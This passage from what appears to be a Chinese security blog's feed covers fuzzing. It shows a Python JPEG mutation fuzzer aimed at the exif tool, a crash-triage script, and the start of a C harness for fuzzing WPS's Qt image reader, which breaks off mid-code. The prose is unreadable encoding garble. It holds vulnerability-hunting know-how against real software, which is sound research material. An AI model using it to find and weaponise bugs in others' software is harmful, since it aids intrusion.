Conclusion</h2><p><code>fuzzer</code>å¯ä»¥è¿›è¡Œå¾ˆå¤šä¼˜åŒ–ï¼Œç›®å‰å®ƒçœŸçš„å¾ˆç²—ç³™ï¼Œåªæ˜¯ä¸ºäº†æ¼”ç¤ºéå¸¸åŸºæœ¬çš„ç¼–è¯‘<code>fuzzing</code>ï¼Œ<code>bug</code>åˆ†ç±»è¿‡ç¨‹ä¹Ÿæ˜¯ä¸€å›¢ç³Ÿï¼Œæ„Ÿè§‰æ•´ä¸ªè¿‡ç¨‹éƒ½å¾ˆ<code>hacky</code>ï¼Œæˆ‘æƒ³æˆ‘éœ€è¦çœ‹æ›´å¤š<code>@gamozolabs</code>çš„è§†é¢‘ï¼Œä¹Ÿè®¸ä¸‹æ¬¡æˆ‘ä»¬è¿›è¡Œæ¨¡ç³Šæµ‹è¯•æ—¶ï¼Œæˆ‘ä»¬ä¼šå°è¯•ä¸€ä¸ªæ›´éš¾çš„ç›®æ ‡ï¼Œç”¨<code>Rust</code>æˆ–<code>Go</code>ç­‰å¾ˆé…·çš„è¯­è¨€ç¼–å†™æ¨¡ç³Šæµ‹è¯•ï¼Œæˆ‘ä»¬å°†ä¼šå°è¯•çœŸæ­£æ”¹è¿›åˆ†ç±»è¿‡ç¨‹/åˆ©ç”¨å…¶ä¸­ä¸€ä¸ª<code>bugs</code>ï¼</p><p>æ„Ÿè°¢åšæ–‡ä¸­æåˆ°çš„æ¯ä¸ªäººï¼Œéå¸¸æ„Ÿè°¢</p><p>ç›´åˆ°ä¸‹ä¸€æ¬¡ï¼</p><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><p><code>JPEGfuzz.py</code></p><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><span class="hljs-keyword">import</span> sys<span class="hljs-keyword">import</span> random<span class="hljs-keyword">from</span> pexpect <span class="hljs-keyword">import</span> run<span class="hljs-keyword">from</span> pipes <span class="hljs-keyword">import</span> quote<span class="hljs-comment"># read bytes from our valid JPEG and return them in a mutable bytearray </span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_bytes</span>(<span class="hljs-params">filename</span>):</span>    f = open(filename, <span class="hljs-string">&quot;rb&quot;</span>).read()    <span class="hljs-keyword">return</span> bytearray(f)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bit_flip</span>(<span class="hljs-params">data</span>):</span>    num_of_flips = int((len(data) - <span class="hljs-number">4</span>) * <span class="hljs-number">.01</span>)    indexes = range(<span class="hljs-number">4</span>, (len(data) - <span class="hljs-number">4</span>))    chosen_indexes = []    <span class="hljs-comment"># iterate selecting indexes until we&#x27;ve hit our num_of_flips number</span>    counter = <span class="hljs-number">0</span>    <span class="hljs-keyword">while</span> counter &lt; num_of_flips:        chosen_indexes.append(random.choice(indexes))        counter += <span class="hljs-number">1</span>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> chosen_indexes:        current = data[x]        current = (bin(current).replace(<span class="hljs-string">&quot;0b&quot;</span>,<span class="hljs-string">&quot;&quot;</span>))        current = <span class="hljs-string">&quot;0&quot;</span> * (<span class="hljs-number">8</span> - len(current)) + current                indexes = range(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>)        picked_index = random.choice(indexes)        new_number = []        <span class="hljs-comment"># our new_number list now has all the digits, example: [&#x27;1&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;0&#x27;]</span>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> current:            new_number.append(i)        <span class="hljs-comment"># if the number at our randomly selected index is a 1, make it a 0, and vice versa</span>        <span class="hljs-keyword">if</span> new_number[picked_index] == <span class="hljs-string">&quot;1&quot;</span>:            new_number[picked_index] = <span class="hljs-string">&quot;0&quot;</span>        <span class="hljs-keyword">else</span>:            new_number[picked_index] = <span class="hljs-string">&quot;1&quot;</span>        <span class="hljs-comment"># create our new binary string of our bit-flipped number</span>        current = <span class="hljs-string">&#x27;&#x27;</span>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> new_number:            current += i        <span class="hljs-comment"># convert that string to an integer</span>        current = int(current,<span class="hljs-number">2</span>)        <span class="hljs-comment"># change the number in our byte array to our new number we just constructed</span>        data[x] = current    <span class="hljs-keyword">return</span> data<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">magic</span>(<span class="hljs-params">data</span>):</span>    magic_vals = [    (<span class="hljs-number">1</span>, <span class="hljs-number">255</span>),    (<span class="hljs-number">1</span>, <span class="hljs-number">255</span>),    (<span class="hljs-number">1</span>, <span class="hljs-number">127</span>),    (<span class="hljs-number">1</span>, <span class="hljs-number">0</span>),    (<span class="hljs-number">2</span>, <span class="hljs-number">255</span>),    (<span class="hljs-number">2</span>, <span class="hljs-number">0</span>),    (<span class="hljs-number">4</span>, <span class="hljs-number">255</span>),    (<span class="hljs-number">4</span>, <span class="hljs-number">0</span>),    (<span class="hljs-number">4</span>, <span class="hljs-number">128</span>),    (<span class="hljs-number">4</span>, <span class="hljs-number">64</span>),    (<span class="hljs-number">4</span>, <span class="hljs-number">127</span>)    ]    picked_magic = random.choice(magic_vals)    length = len(data) - <span class="hljs-number">8</span>    index = range(<span class="hljs-number">0</span>, length)    picked_index = random.choice(index)    <span class="hljs-comment"># here we are hardcoding all the byte overwrites for all of the tuples that begin (1, )</span>    <span class="hljs-keyword">if</span> picked_magic[<span class="hljs-number">0</span>] == <span class="hljs-number">1</span>:        <span class="hljs-keyword">if</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">255</span>:<span class="hljs-comment"># 0xFF</span>            data[picked_index] = <span class="hljs-number">255</span>        <span class="hljs-keyword">elif</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">127</span>:<span class="hljs-comment"># 0x7F</span>            data[picked_index] = <span class="hljs-number">127</span>        <span class="hljs-keyword">elif</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">0</span>:<span class="hljs-comment"># 0x00</span>            data[picked_index] = <span class="hljs-number">0</span>    <span class="hljs-comment"># here we are hardcoding all the byte overwrites for all of the tuples that begin (2, )</span>    <span class="hljs-keyword">elif</span> picked_magic[<span class="hljs-number">0</span>] == <span class="hljs-number">2</span>:        <span class="hljs-keyword">if</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">255</span>:<span class="hljs-comment"># 0xFFFF</span>            data[picked_index] = <span class="hljs-number">255</span>            data[picked_index + <span class="hljs-number">1</span>] = <span class="hljs-number">255</span>        <span class="hljs-keyword">elif</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">0</span>:<span class="hljs-comment"># 0x0000</span>            data[picked_index] = <span class="hljs-number">0</span>            data[picked_index + <span class="hljs-number">1</span>] = <span class="hljs-number">0</span>    <span class="hljs-comment"># here we are hardcoding all of the byte overwrites for all of the tuples that being (4, )</span>    <span class="hljs-keyword">elif</span> picked_magic[<span class="hljs-number">0</span>] == <span class="hljs-number">4</span>:        <span class="hljs-keyword">if</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">255</span>:<span class="hljs-comment"># 0xFFFFFFFF</span>            data[picked_index] = <span class="hljs-number">255</span>            data[picked_index + <span class="hljs-number">1</span>] = <span class="hljs-number">255</span>            data[picked_index + <span class="hljs-number">2</span>] = <span class="hljs-number">255</span>            data[picked_index + <span class="hljs-number">3</span>] = <span class="hljs-number">255</span>        <span class="hljs-keyword">elif</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">0</span>:<span class="hljs-comment"># 0x00000000</span>            data[picked_index] = <span class="hljs-number">0</span>            data[picked_index + <span class="hljs-number">1</span>] = <span class="hljs-number">0</span>            data[picked_index + <span class="hljs-number">2</span>] = <span class="hljs-number">0</span>            data[picked_index + <span class="hljs-number">3</span>] = <span class="hljs-number">0</span>        <span class="hljs-keyword">elif</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">128</span>:<span class="hljs-comment"># 0x80000000</span>            data[picked_index] = <span class="hljs-number">128</span>            data[picked_index + <span class="hljs-number">1</span>] = <span class="hljs-number">0</span>            data[picked_index + <span class="hljs-number">2</span>] = <span class="hljs-number">0</span>            data[picked_index + <span class="hljs-number">3</span>] = <span class="hljs-number">0</span>        <span class="hljs-keyword">elif</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">64</span>:<span class="hljs-comment"># 0x40000000</span>            data[picked_index] = <span class="hljs-number">64</span>            data[picked_index + <span class="hljs-number">1</span>] = <span class="hljs-number">0</span>            data[picked_index + <span class="hljs-number">2</span>] = <span class="hljs-number">0</span>            data[picked_index + <span class="hljs-number">3</span>] = <span class="hljs-number">0</span>        <span class="hljs-keyword">elif</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">127</span>:<span class="hljs-comment"># 0x7FFFFFFF</span>            data[picked_index] = <span class="hljs-number">127</span>            data[picked_index + <span class="hljs-number">1</span>] = <span class="hljs-number">255</span>            data[picked_index + <span class="hljs-number">2</span>] = <span class="hljs-number">255</span>            data[picked_index + <span class="hljs-number">3</span>] = <span class="hljs-number">255</span>            <span class="hljs-keyword">return</span> data<span class="hljs-comment"># create new jpg with mutated data</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_new</span>(<span class="hljs-params">data</span>):</span>    f = open(<span class="hljs-string">&quot;mutated.jpg&quot;</span>, <span class="hljs-string">&quot;wb+&quot;</span>)    f.write(data)    f.close()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exif</span>(<span class="hljs-params">counter,data</span>):</span>    command = <span class="hljs-string">&quot;exif mutated.jpg -verbose&quot;</span>    out, returncode = run(<span class="hljs-string">&quot;sh -c &quot;</span> + quote(command), withexitstatus=<span class="hljs-number">1</span>)    <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;Segmentation&quot;</span> <span class="hljs-keyword">in</span> out:        f = open(<span class="hljs-string">&quot;crashes2/crash.&#123;&#125;.jpg&quot;</span>.format(str(counter)), <span class="hljs-string">&quot;ab+&quot;</span>)        f.write(data)    <span class="hljs-keyword">if</span> counter % <span class="hljs-number">100</span> == <span class="hljs-number">0</span>:        print(counter, end=<span class="hljs-string">&quot;\r&quot;</span>)<span class="hljs-keyword">if</span> len(sys.argv) &lt; <span class="hljs-number">2</span>:    print(<span class="hljs-string">&quot;Usage: JPEGfuzz.py &lt;valid_jpg&gt;&quot;</span>)<span class="hljs-keyword">else</span>:    filename = sys.argv[<span class="hljs-number">1</span>]    counter = <span class="hljs-number">0</span>    <span class="hljs-keyword">while</span> counter &lt; <span class="hljs-number">100000</span>:        data = get_bytes(filename)        functions = [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>]        picked_function = random.choice(functions)        <span class="hljs-keyword">if</span> picked_function == <span class="hljs-number">0</span>:            mutated = magic(data)            create_new(mutated)            exif(counter,mutated)        <span class="hljs-keyword">else</span>:            mutated = bit_flip(data)            create_new(mutated)            exif(counter,mutated)        counter += <span class="hljs-number">1</span></code></pre><p><code>triage.py</code></p><pre><code class="hljs python3">#!&#x2F;usr&#x2F;bin&#x2F;env python3import osfrom os import listdirdef get_files():    files &#x3D; os.listdir(&quot;&#x2F;root&#x2F;crashes&#x2F;&quot;)    return filesdef triage_files(files):    for x in files:        original_output &#x3D; os.popen(&quot;exifsan &quot; + x + &quot; -verbose 2&gt;&amp;1&quot;).read()        output &#x3D; original_output                # Getting crash reason        crash &#x3D; &#39;&#39;        if &quot;SEGV&quot; in output:            crash &#x3D; &quot;SEGV&quot;        elif &quot;heap-buffer-overflow&quot; in output:            crash &#x3D; &quot;HBO&quot;        else:            crash &#x3D; &quot;UNKNOWN&quot;                if crash &#x3D;&#x3D; &quot;HBO&quot;:            output &#x3D; output.split(&quot;\n&quot;)            counter &#x3D; 0            while counter &lt; len(output):                if output[counter] &#x3D;&#x3D; &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;:                    target_line &#x3D; output[counter + 1]                    target_line2 &#x3D; output[counter + 2]                    counter +&#x3D; 1                else:                    counter +&#x3D; 1            target_line &#x3D; target_line.split(&quot; &quot;)            address &#x3D; target_line[5].replace(&quot;0x&quot;,&quot;&quot;)                        target_line2 &#x3D; target_line2.split(&quot; &quot;)            operation &#x3D; target_line2[0]                    elif crash &#x3D;&#x3D; &quot;SEGV&quot;:            output &#x3D; output.split(&quot;\n&quot;)            counter &#x3D; 0            while counter &lt; len(output):                if output[counter] &#x3D;&#x3D; &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;:                    target_line &#x3D; output[counter + 1]                    target_line2 &#x3D; output[counter + 2]                    counter +&#x3D; 1                else:                    counter +&#x3D; 1            if &quot;unknown address&quot; in target_line:                address &#x3D; &quot;00000000&quot;            else:                address &#x3D; None            if &quot;READ&quot; in target_line2:                operation &#x3D; &quot;READ&quot;            elif &quot;WRITE&quot; in target_line2:                operation &#x3D; &quot;WRITE&quot;            else:                operation &#x3D; None        log_name &#x3D; (x.replace(&quot;.jpg&quot;,&quot;&quot;) + &quot;.&quot; + crash + &quot;.&quot; + address + &quot;.&quot; + operation)        f &#x3D; open(log_name,&quot;w+&quot;)        f.write(original_output)        f.close()files &#x3D; get_files()triage_files(files)</code></pre>]]></content>
    
    
    <categories>
      
      <category>Fuzz</category>
      
    </categories>
    
    
    <tags>
      
      <tag>fuzz</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å¯¹wpsçš„qtcoreçš„æŸä¸€æ¥å£fuzz</title>
    <link href="/2022/03/29/wps%20fuzz/"/>
    <url>/2022/03/29/wps%20fuzz/</url>
    
    <content type="html"><![CDATA[<p>ä¸»è¦çœ‹åˆ°ä»¥ä¸‹ä¸‰ç¯‡<code>blog</code></p><blockquote><p><a href="http://zeifan.my/security/rce/heap/2020/09/03/wps-rce-heap.html">http://zeifan.my/security/rce/heap/2020/09/03/wps-rce-heap.html</a><br><a href="https://www.anquanke.com/post/id/240938">https://www.anquanke.com/post/id/240938</a><br><a href="https://ruan777.github.io/2021/06/02/%E4%BD%BF%E7%94%A8winafl%E5%AF%B9qtcore%E7%9A%84%E4%B8%80%E6%AC%A1fuzz%E5%B0%9D%E8%AF%95">https://ruan777.github.io/2021/06/02/ä½¿ç”¨winaflå¯¹qtcoreçš„ä¸€æ¬¡fuzzå°è¯•</a></p></blockquote><p>å› æ­¤å°è¯•å¯¹<code>linux</code>ä¸Šçš„<code>wps</code>çš„<code>qtcore4</code>è¿›è¡Œ<code>fuzz</code></p><pre><code class="hljs yaml"><span class="hljs-string">ç¯å¢ƒï¼š</span><span class="hljs-attr">linux:</span> <span class="hljs-string">ubuntu</span> <span class="hljs-number">20.04</span><span class="hljs-attr">wps:</span> <span class="hljs-number">11.1</span><span class="hljs-number">.0</span><span class="hljs-number">.10161</span><span class="hljs-attr">libcQtCore:</span> <span class="hljs-number">4.7</span><span class="hljs-number">.4</span></code></pre><h2 id="æ•´ä½“çš„é€»è¾‘"><a href="#æ•´ä½“çš„é€»è¾‘" class="headerlink" title="æ•´ä½“çš„é€»è¾‘"></a>æ•´ä½“çš„é€»è¾‘</h2><p>æ ¹æ®<code>Nafiez</code>çš„æŠ¥å‘Šï¼Œå¯ä»¥çŸ¥é“ï¼Œä¸»è¦æ˜¯<code>kso.dll</code>ä¸­è°ƒç”¨<code>QtCore4.dll</code>çš„<code>QImageReader::read()</code>å‡ºé”™çš„ï¼Œå› æ­¤åç»­ä¸¤ç¯‡æ–‡ç« å‡å¯¹äº<code>QtCore4.dll</code>çš„è¯¥æ¥å£è¿›è¡Œ<code>fuzz</code></p><pre><code class="hljs apache"><span class="hljs-attribute">0</span>:<span class="hljs-number">000</span>&gt; !heap -p -a cc<span class="hljs-number">53</span>afbc    <span class="hljs-attribute">address</span> cc<span class="hljs-number">53</span>afbc found in    <span class="hljs-attribute">_DPH_HEAP_ROOT</span> @ <span class="hljs-number">6731000</span>    <span class="hljs-attribute">in</span> busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)                                <span class="hljs-attribute">cc36323c</span>:         cc<span class="hljs-number">53</span>afa<span class="hljs-number">8</span>               <span class="hljs-number">58</span> -         cc<span class="hljs-number">53</span>a<span class="hljs-number">000</span>             <span class="hljs-number">2000</span>    <span class="hljs-attribute">6f13ab70</span> verifier!AVrfDebugPageHeapAllocate+<span class="hljs-number">0</span>x<span class="hljs-number">00000240</span>    <span class="hljs-attribute">77a9909b</span> ntdll!RtlDebugAllocateHeap+<span class="hljs-number">0</span>x<span class="hljs-number">00000039</span>    <span class="hljs-attribute">779ebbad</span> ntdll!RtlpAllocateHeap+<span class="hljs-number">0</span>x<span class="hljs-number">000000</span>ed    <span class="hljs-attribute">779eb0cf</span> ntdll!RtlpAllocateHeapInternal+<span class="hljs-number">0</span>x<span class="hljs-number">0000022</span>f    <span class="hljs-attribute">779eae8e</span> ntdll!RtlAllocateHeap+<span class="hljs-number">0</span>x<span class="hljs-number">0000003</span>e    <span class="hljs-attribute">6f080269</span> MSVCR<span class="hljs-number">100</span>!malloc+<span class="hljs-number">0</span>x<span class="hljs-number">0000004</span>b    <span class="hljs-attribute">6f08233b</span> MSVCR<span class="hljs-number">100</span>!operator new+<span class="hljs-number">0</span>x<span class="hljs-number">0000001</span>f    <span class="hljs-attribute">6b726c67</span> QtCore<span class="hljs-number">4</span>!QImageData::create+<span class="hljs-number">0</span>x<span class="hljs-number">000000</span>fa    <span class="hljs-attribute">6b726b54</span> QtCore<span class="hljs-number">4</span>!QImage::QImage+<span class="hljs-number">0</span>x<span class="hljs-number">0000004</span>e    <span class="hljs-attribute">6b7a0e21</span> QtCore<span class="hljs-number">4</span>!png_get_text+<span class="hljs-number">0</span>x<span class="hljs-number">00000436</span>    <span class="hljs-attribute">6b79d7a8</span> QtCore<span class="hljs-number">4</span>!QImageIOHandler::setFormat+<span class="hljs-number">0</span>x<span class="hljs-number">000000</span>de    <span class="hljs-attribute">6b79d457</span> QtCore<span class="hljs-number">4</span>!QPixmapData::fromFile+<span class="hljs-number">0</span>x<span class="hljs-number">000002</span>bf    <span class="hljs-attribute">6b725eb4</span> QtCore<span class="hljs-number">4</span>!QImageReader::read+<span class="hljs-number">0</span>x<span class="hljs-number">000001</span>e<span class="hljs-number">2</span>    <span class="hljs-attribute">6d0ca585</span> kso!kpt::VariantImage::forceUpdateCacheImage+<span class="hljs-number">0</span>x<span class="hljs-number">0000254</span>e    <span class="hljs-attribute">6d0c5964</span> kso!kpt::Direct<span class="hljs-number">2</span>DPaintEngineHelper::operator=+<span class="hljs-number">0</span>x<span class="hljs-number">00000693</span>    <span class="hljs-attribute">6d0c70d0</span> kso!kpt::RelativeRect::unclipped+<span class="hljs-number">0</span>x<span class="hljs-number">00001146</span>    <span class="hljs-attribute">6d0c8d0c</span> kso!kpt::VariantImage::forceUpdateCacheImage+<span class="hljs-number">0</span>x<span class="hljs-number">00000</span>cd<span class="hljs-number">5</span>    <span class="hljs-attribute">6d451d5c</span> kso!BlipCacheMgr::BrushCache+<span class="hljs-number">0</span>x<span class="hljs-number">0000049</span>a    <span class="hljs-attribute">6d451e85</span> kso!BlipCacheMgr::GenerateBitmap+<span class="hljs-number">0</span>x<span class="hljs-number">0000001</span>d    <span class="hljs-attribute">6d453227</span> kso!BlipCacheMgr::GenCachedBitmap+<span class="hljs-number">0</span>x<span class="hljs-number">00000083</span>    <span class="hljs-attribute">6d29bb92</span> kso!drawing::PictureRenderLayer::render+<span class="hljs-number">0</span>x<span class="hljs-number">000009</span>b<span class="hljs-number">6</span>    <span class="hljs-attribute">6d450fb1</span> kso!drawing::RenderTargetImpl::paint+<span class="hljs-number">0</span>x<span class="hljs-number">00000090</span>    <span class="hljs-attribute">6d29b528</span> kso!drawing::PictureRenderLayer::render+<span class="hljs-number">0</span>x<span class="hljs-number">0000034</span>c    <span class="hljs-attribute">6d2a2d83</span> kso!drawing::VisualRenderer::render+<span class="hljs-number">0</span>x<span class="hljs-number">00000060</span>    <span class="hljs-attribute">6d2b8970</span> kso!drawing::SingleVisualRenderer::drawNormal+<span class="hljs-number">0</span>x<span class="hljs-number">000002</span>b<span class="hljs-number">5</span>    <span class="hljs-attribute">6d2b86a7</span> kso!drawing::SingleVisualRenderer::draw+<span class="hljs-number">0</span>x<span class="hljs-number">000001</span>e<span class="hljs-number">1</span>    <span class="hljs-attribute">6d2b945e</span> kso!drawing::SingleVisualRenderer::draw+<span class="hljs-number">0</span>x<span class="hljs-number">00000046</span>    <span class="hljs-attribute">6d3d0142</span> kso!drawing::ShapeVisual::paintEvent+<span class="hljs-number">0</span>x<span class="hljs-number">0000044</span>a    <span class="hljs-attribute">680a2b5c</span> wpsmain!WpsShapeTreeVisual::getHittestSubVisuals+<span class="hljs-number">0</span>x<span class="hljs-number">000068</span>f<span class="hljs-number">1</span>    <span class="hljs-attribute">6d0e36df</span> kso!AbstractVisual::visualEvent+<span class="hljs-number">0</span>x<span class="hljs-number">00000051</span>    <span class="hljs-attribute">6d3cbe97</span> kso!drawing::ShapeVisual::visualEvent+<span class="hljs-number">0</span>x<span class="hljs-number">0000018</span>f    <span class="hljs-attribute">6d0eba90</span> kso!VisualPaintEvent::arriveVisual+<span class="hljs-number">0</span>x<span class="hljs-number">0000004</span>e</code></pre><p>åç»­ä¸¤ç¯‡æ–‡ç« <code>fuzz</code>çš„ä»£ç é€»è¾‘ä¸º</p><pre><code class="hljs maxima">QImage <span class="hljs-built_in">image</span>;QImageReader reader;QString image_file_name;# <span class="hljs-built_in">transform</span> (char[] <span class="hljs-built_in">file_name</span>) to (QString image_file_name)reader.setFileName(image_file_name)reader.<span class="hljs-built_in">read</span>(<span class="hljs-built_in">image</span>);</code></pre><h2 id="ä»windowsåˆ°linux"><a href="#ä»windowsåˆ°linux" class="headerlink" title="ä»windowsåˆ°linux"></a>ä»windowsåˆ°linux</h2><p>åœ¨è¿ç§»çš„æ—¶å€™ï¼Œå°±å»æ‰¾äº†ä¸€ä¸‹å¯¹åº”çš„<code>libQtCore.so.4.7.4</code>çš„æ¥å£ï¼Œå¾—åˆ°äº†ä»¥ä¸‹çš„ä»£ç </p><pre><code class="hljs c"><span class="hljs-comment">// gcc -g -masm=intel ./qt_reader.c -ldl -no-pie -o qt_reader</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;dlfcn.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><span class="hljs-function"></span>&#123;    dlopen(<span class="hljs-string">&quot;/path/libc++.so.1&quot;</span>, RTLD_LAZY);    dlopen(<span class="hljs-string">&quot;/path/libpng12.so.0&quot;</span>, RTLD_LAZY);    dlopen(<span class="hljs-string">&quot;/path/libc++abi.so.1&quot;</span>, RTLD_LAZY);    <span class="hljs-keyword">void</span>* handle = dlopen(<span class="hljs-string">&quot;/path/libQtCore.so.4.7.4&quot;</span>, RTLD_LAZY);    <span class="hljs-keyword">if</span> (handle == <span class="hljs-number">0</span>)    &#123;        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;open handle failed&quot;</span>);        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, dlerror());        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);    &#125;        <span class="hljs-comment">// QImageReader::QImageReader(QImageReader *this)</span>    <span class="hljs-keyword">void</span> (*qt_qimageReader)() = dlsym(handle, <span class="hljs-string">&quot;_ZN12QImageReaderC2Ev&quot;</span>);    <span class="hljs-comment">// QImageReader::read(QImageReader *this, QImage *a2)</span>    <span class="hljs-keyword">void</span> (*qt_qimageReader_read)() = dlsym(handle, <span class="hljs-string">&quot;_ZN12QImageReader4readEP6QImage&quot;</span>);    <span class="hljs-comment">// QImageReader::setFileName(QImageReader *this, const QString *a2)</span>    <span class="hljs-keyword">void</span> (*qt_setFileName)() = dlsym(handle, <span class="hljs-string">&quot;_ZN12QImageReader11setFileNameERK7QString&quot;</span>);    <span class="hljs-comment">// QString::QString(QString *this, const QChar *)</span>    <span class="hljs-keyword">void</span> (*qt_qstring)() = dlsym(handle, <span class="hljs-string">&quot;_ZN7QStringC2EPK5QChar&quot;</span>);    <span class="hljs-comment">// QString::fromLatin1(QString *this, const char *, unsigned int)</span>    <span class="hljs-keyword">void</span> (*qt_qstring_fromlatin1)() = dlsym(handle, <span class="hljs-string">&quot;_ZN7QString10fromLatin1EPKci&quot;</span>);    <span class="hljs-comment">// QImage::QImage(QImage *this)</span>    <span class="hljs-keyword">void</span> (*qt_qimage)() = dlsym(handle, <span class="hljs-string">&quot;_ZN6QImageC2Ev&quot;</span>);    <span class="hljs-comment">// QFile::exists(QFile *__hidden this)</span>    <span class="hljs-keyword">void</span> (*qt_qfile_exits)() = dlsym(handle, <span class="hljs-string">&quot;_ZNK5QFile6existsEv&quot;</span>);    <span class="hljs-comment">// QFile::close()</span>    <span class="hljs-keyword">void</span> (*qt_close)() = dlsym(handle, <span class="hljs-string">&quot;_ZN5QFile5closeEv&quot;</span>);    <span class="hljs-keyword">char</span>* image = (<span class="hljs-keyword">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<span class="hljs-keyword">char</span>* qstring = (<span class="hljs-keyword">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<span class="hljs-keyword">char</span>* reader = (<span class="hljs-keyword">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);    <span class="hljs-keyword">char</span>* file_name = argv[<span class="hljs-number">1</span>];    <span class="hljs-comment">// pusha</span>    __asm__ __volatile__(        <span class="hljs-string">&quot;push rax\n&quot;</span>        <span class="hljs-string">&quot;push rbx\n&quot;</span>        <span class="hljs-string">&quot;push rcx\n&quot;</span>          <span class="hljs-string">&quot;push rdx\n&quot;</span>              <span class="hljs-string">&quot;push rbp\n&quot;</span>              <span class="hljs-string">&quot;push rdi\n&quot;</span>              <span class="hljs-string">&quot;push rsi\n&quot;</span>              <span class="hljs-string">&quot;push r8\n&quot;</span>              <span class="hljs-string">&quot;push r9\n&quot;</span>              <span class="hljs-string">&quot;push r10\n&quot;</span>              <span class="hljs-string">&quot;push r11\n&quot;</span>              <span class="hljs-string">&quot;push r12\n&quot;</span>              <span class="hljs-string">&quot;push r13\n&quot;</span>              <span class="hljs-string">&quot;push r14\n&quot;</span>              <span class="hljs-string">&quot;push r15\n&quot;</span>        <span class="hljs-string">&quot;push r15\n&quot;</span>);    <span class="hljs-comment">// QImage::QImage(image)</span>    __asm__ __volatile__ (        <span class="hljs-string">&quot;call rax\n&quot;</span>        :        : <span class="hljs-string">&quot;D&quot;</span>(image), <span class="hljs-string">&quot;a&quot;</span>(qt_qimage)    );        <span class="hljs-comment">// QImageReader::QImageReader(reader)</span>    __asm__ __volatile__ (        <span class="hljs-string">&quot;call rax\n&quot;</span>        :        : <span class="hljs-string">&quot;D&quot;</span>(reader), <span class="hljs-string">&quot;a&quot;</span>(qt_qimageReader)    );    <span class="hljs-comment">// **************** This is a wrong interface of transforming the char to QString ***********************</span>    <span class="hljs-comment">// // QString::QString(qstring, file_name)</span>    <span class="hljs-comment">// __asm__ __volatile__ (</span>    <span class="hljs-comment">//     &quot;call rax\n&quot;</span>    <span class="hljs-comment">//     :</span>    <span class="hljs-comment">//     : &quot;D&quot;(qstring), &quot;S&quot;(file_name), &quot;a&quot;(qt_qstring)</span>    <span class="hljs-comment">// );</span>    <span class="hljs-comment">// QString::fromLatin1(QString *this, const char *, unsigned int)</span>    